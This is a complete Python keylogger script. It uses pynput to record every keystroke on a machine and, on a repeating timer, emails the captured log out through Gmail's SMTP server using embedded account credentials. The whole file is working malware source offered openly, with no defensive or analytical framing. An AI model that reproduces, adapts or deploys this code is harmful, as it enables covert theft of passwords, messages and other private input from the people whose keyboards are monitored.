#!/usr/bin/env python
import pynput.keyboard
import threading, smtplib


class Keylogger:
    def __init__(self, timer_interval, email, password):
        self.log = "Keylogger started"
        self.interval = timer_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):

        sever = smtplib.SMTP("smtp.gmail.com", 587)

        sever.starttls()

        sever.login(email, password)

        sever.sendmail(email, email, message)

        sever.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
